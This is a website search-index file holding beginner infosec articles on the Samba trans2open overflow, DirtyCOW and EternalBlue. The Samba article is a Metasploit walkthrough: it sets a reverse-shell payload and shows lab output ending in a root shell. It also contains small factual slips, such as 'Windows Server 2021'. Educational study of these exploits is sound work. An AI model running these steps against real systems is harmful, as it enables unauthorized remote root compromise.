var relearn_search_index = [
  {
    "content": "Articles about common exploits will be posted under this section.\nInformation contained in these articles have been sourced from various sites during the course of my studies. I have tried to construct the articles in such a way that it would be easy for beginners in the field (Infosec, or Information Security) to understand. The material provided here is intended solely for educational purposes only. I intend no copyright infringement of any kind. List of sites I have collated the material from, will be mentioned wherever possible. The information contained in this post is intended solely to provide general guidance on matters of interest for the personal use of the reader, who accepts full responsibility for its use. While every attempt has been made to ensure that the information contained on this article has been obtained from reliable sources, I am not responsible for any errors or omissions, or for the results obtained from the use of this information.\n",
    "description": "",
    "tags": null,
    "title": "Exploit Articles",
    "uri": "/exploit-articles/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "exploit",
    "uri": "/tags/exploit/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "linux",
    "uri": "/tags/linux/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "samba",
    "uri": "/tags/samba/index.html"
  },
  {
    "content": "A little about Samba.\nSamba is the standard Windows interoperabiity suite of programs for Linux and Unix. The Samba package provides secure, stable and fast file and print services for all clients such as OS/2, Linux, FreeBSD, using the SMB/CIFS protocol.\nSamba is an important component to seamlessly integrate Linux servers and desktops into a Windows Active Directory environment. It can function both as a domain controller or as a regular domain member.\nIn Samba versions 2.2.0 to 2.2.8a, running on x86 Linux systems that do not have the noexec stack option set, there exists a buffer overflow vulnerability which could lead to remote administrative privilege compromise. This vulnerability could allow a remote attacker to execute arbitrary code on the affected system. The stack overflow error is believed to be in the trans2open() function call.\nThere are at least 3 variants of the trans2open exploit, one written in C and two written in the Perl scripting language.\nSamba trans2open Overflow (Linux x86) - Metasploit\nThere are four metasploit exploit modules, as shown in the screenshot below:\nBasic usage:\nmsf6 \u003e use exploit/linux/samba/trans2open [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp msf6 exploit(linux/samba/trans2open) \u003e options Module options (exploit/linux/samba/trans2open): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us ing-metasploit.html RPORT 139 yes The target port (TCP) Payload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.2.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Samba 2.2.x - Bruteforce View the full module info with the info, or info -d command. We need to set the following options before running the exploit\nRHOSTS → IP Address of the target Linux server LHOST → IP Address of the attacker machine Set the payload with set payload linux/x86/shell_reverse_tcp Once both these options are set, execute the exploit by typing run or exploit.\nMetasploit will run the exploit, and you will get root privileges on the target machine.\n[*] Started reverse TCP handler on 192.168.56.11:4444 [*] 192.168.56.110:139 - Trying return address 0xbffffdfc... [*] 192.168.56.110:139 - Trying return address 0xbffffcfc... [*] 192.168.56.110:139 - Trying return address 0xbffffbfc... [*] 192.168.56.110:139 - Trying return address 0xbffffafc... [*] 192.168.56.110:139 - Trying return address 0xbffff9fc... [*] 192.168.56.110:139 - Trying return address 0xbffff8fc... [*] 192.168.56.110:139 - Trying return address 0xbffff7fc... [*] 192.168.56.110:139 - Trying return address 0xbffff6fc... [*] Command shell session 1 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32773) at 2022-05-24 19:34:58 +0400 [*] Command shell session 2 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32774) at 2022-05-24 19:34:59 +0400 [*] Command shell session 3 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32775) at 2022-05-24 19:35:01 +0400 [*] Command shell session 4 opened (192.168.56.11:4444 -\u003e 192.168.56.110:32776) at 2022-05-24 19:35:02 +0400 id uid=0(root) gid=0(root) groups=99(nobody) Reference Links:\nexploit-db.com\ninfosecmatter.com\nsamba.org\nmetasploit.com\n",
    "description": "",
    "tags": [
      "exploit",
      "samba",
      "linux"
    ],
    "title": "Samba Trans2open Exploit",
    "uri": "/exploit-articles/samba-trans2open-exploit/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "dirtycow",
    "uri": "/tags/dirtycow/index.html"
  },
  {
    "content": "DirtyCOW (CVE-2016-5195) The DirtyCOW is a vulnerability in the Linux kernel which allowed processes, write access to read only memory mappings. This vulnerability was discovered by Phil Oester.\nThe vulnerability is called DirtyCOW because the issue is caused by a race condition 1 in the way the kernel handles copy-on-write (COW) COW is an optimization strategy used by operating systems. When multiple processes ask for resources, the system can give them pointers to the same resource. This state can be maintained until a program tries to modify its copy of the resource. When processes try to do this, a private copy of the resource is created so that other processes cannot read that data. The Linux kernel’s COW implementation had a flaw which causes a race condition, allowing non-privileged users to alter root owned files. This flaw, effectively gives unprivileged local users write access to otherwise ready only memory mappings and thus elevate their privileges on the affected system.\nThe dirty part of the name comes from the Dirty Bit. A dirty bit or modified bit is a bit that is associated with a block of memory and indicates whether the corresponding block of memory has been modified. The dirty bit is set when the processor writes to (modifies) this memory. The dirty bit indicates that its associated block of memory has been modified and not saved to storage yet.\nWhen a block of memory is to be replaced, its corresponding dirty bit is checked to see if the block needs to be written back to secondary memory before being replaced, or it can simply be removed. Dirty bits are used by CPU cache and page replacement algorithms of operating systems.\nWhile most mainstream systems have been patched, there are several other Linux based embedded devices like access control devices, biometric scanners and employee attendance recording devices that are still vulnerable. Since these devices may not receive security updates, DirtyCOW still is an attack vector where such devices are used. The real risk of the vulnerability is when user level access and code execution ability, exists on the device.\nThe vulnerability was patched in Linux kernel versions 4.8.3, 4.7.9, 4.4.26 and newer. The first patch released in 2016 did not fully address remediation of the issue and a revised patch was released in November 2017, before public disclosure of the vulnerability.\nExploit code for this vulnerability is available on https://www.exploit-db.com/exploits/40839. You might have come across and probably ran this exploit while working vulnhub machines.\nA POC exploit is available on GitHub. This exploit script needs to be compiled and run on the affected system in order for it to work.\nA detection/scanner script for this vulnerability is available on https://access.redhat.com/sites/default/files/rh-cve-2016-5195_1.sh.\nAndroid devices ZINU is the first malware for Android devices, which exploit the DirtyCOW vulnerability. It can be used to root any devices upto Android 7.0 Nougat. According to a report from security vendor TrendMicro, over 300,000 malicious apps carrying ZINU were reported in the wild, as of September 2017. Once the user launches an infected app, ZINU connects to its C\u0026C server, then uses the DirtyCOW exploit to gain root privileges to the device. While the exploit cannot be executed remotely, malicious apps can still plant backdoors and execute remote control attacks.\nReferences https://www.secpod.com/blog/dirty-cow-vulnerability/ A YouTube video explaining the exploit is here. https://www.makeuseof.com/tag/dirty-cow-vulnerability-everything-know/ A race condition occurs when two or more threads can access shared data and they try to change it at the same time. Because the thread scheduling algorithm can swap between threads at any time, you don’t know the order in which the threads will attempt to access the shared data. Therefore, the result of the change in data is dependent on the thread scheduling algorithm, i.e. both threads are “racing” to access/change the data. ↩︎\n",
    "description": "",
    "tags": [
      "exploit",
      "dirtycow"
    ],
    "title": "The Dirtycow Exploit",
    "uri": "/exploit-articles/the-dirtycow-exploit/index.html"
  },
  {
    "content": " EternalBlue is the name given to a series of Microsoft software vulnerabilities, as well as an exploit developed by the Unites State’s NSA, as a cyber attack tool. Although the EternalBlue exploit affects only Windows operating systems, anything that uses the SMBv1 file sharing protocol is vulnerable to attack, such as Siemens ultrasound medical equipment.\nEternalBlue was developed the NSA as a part of their controversial program of stockpiling and weaponizing cybersecurity vulnerabilities, rather that flagging those to the appropriate vendor for remediation. The NSA used EternalBlue for 5 years, before alerting Microsoft of its existence. This was probable due to the fact that a group of hackers called The Shadow Brokers hacked the NSA and released their cyber weaponry to the wild. EternalBlue was released as the fifth is a series, the title of the release being Lost in Translation. This was done via a link on their Twitter account, on April 14, 2017.\nBefore it leaked, EternalBlue was one of the most useful exploits in the NSA’s arsenal, used in countless intelligence gathering and counter-terrorism operations. - The New York Times.\nIn short, the NSA discovers the EternalBlue vulnerability and develops an exploit which then was used for their operations for a period of 5 years. Then, they get hacked by The Shadow Brokers, leaving the NSA with no other option than to inform Microsoft if its existence. Microsoft in turn, released the patch MS17-010. This patch was designed to fix the EternalBlue vulnerability in all versions of Windows including Windows Vista, Windows 8.1, Windows 10, Windows Server 2008, Windows Server 2021 and Windows Server 2016.\nDue to the severity of the vulnerability and the sheer number of devices out there, Microsoft also released patched for unsupported versions of Windows like XP and Server 2003.\nHow the exploit works. The exploit works by taking advantage of the vulnerabilities present in SMBv1 protocol in older versions of Windows. SMBv1 was first developed in 1983 as a network communication protocol to enable shared access to file and printers (among others). The exploit makes use of the way Windows handles (or mishandles) specially crafted packets from malicious attackers. Once the attacker send a specially crafted packet to the target server, he could potentially get elevated privileges to the target server. From the target, the attacker could then, potentially move laterally across the network, further compromising other machines.\nThe EternalBlue vulnerability has been famously used to spread the WannaCry, Petya and NotPetya ransomware. The WannaCry cyber attack began on May 2017, spreading at the rate of 16,000 devices per hour, infecting over 230,000 Windows computers across 150 countries in a single day.\nAlmost a million computers still use the vulnerable SMBv1 protocol and remain online. As long as these machines remain unpatched, EternalBlue truly will remain ETERNAL.\nResource Links:\nMicrosoft Security Bulletin MS17-010 - Critical What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant? ",
    "description": "",
    "tags": [
      "eternalblue",
      "exploit"
    ],
    "title": "Eternal Blue",
    "uri": "/exploit-articles/eternal-blue/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "eternalblue",
    "uri": "/tags/eternalblue/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Categories",
    "uri": "/categories/index.html"
  }
]
